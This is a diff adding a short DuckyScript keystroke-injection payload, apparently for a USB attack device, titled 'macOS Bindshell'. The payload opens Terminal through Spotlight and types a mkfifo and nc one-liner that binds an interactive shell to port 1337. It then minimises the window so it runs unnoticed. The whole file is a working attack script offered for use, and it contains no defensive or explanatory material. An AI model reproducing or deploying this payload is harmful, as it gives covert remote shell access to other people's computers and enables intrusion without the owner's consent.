@@ -1,0 +1,16 @@
+REM Title: macOS Bindshell
+REM Author: UndedInside
+REM Description: This creates a bindshell on the macOS target device
+REM This uses nc, and doesn't matter if it's the patched nc without -e
+
+DEFAULT_DELAY 500
+
+REM Open terminal
+GUI SPACE
+STRING terminal
+ENTER
+
+STRINGLN rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1337 > /tmp/f &
+
+REM Minimise window to run stealthily
+GUI M
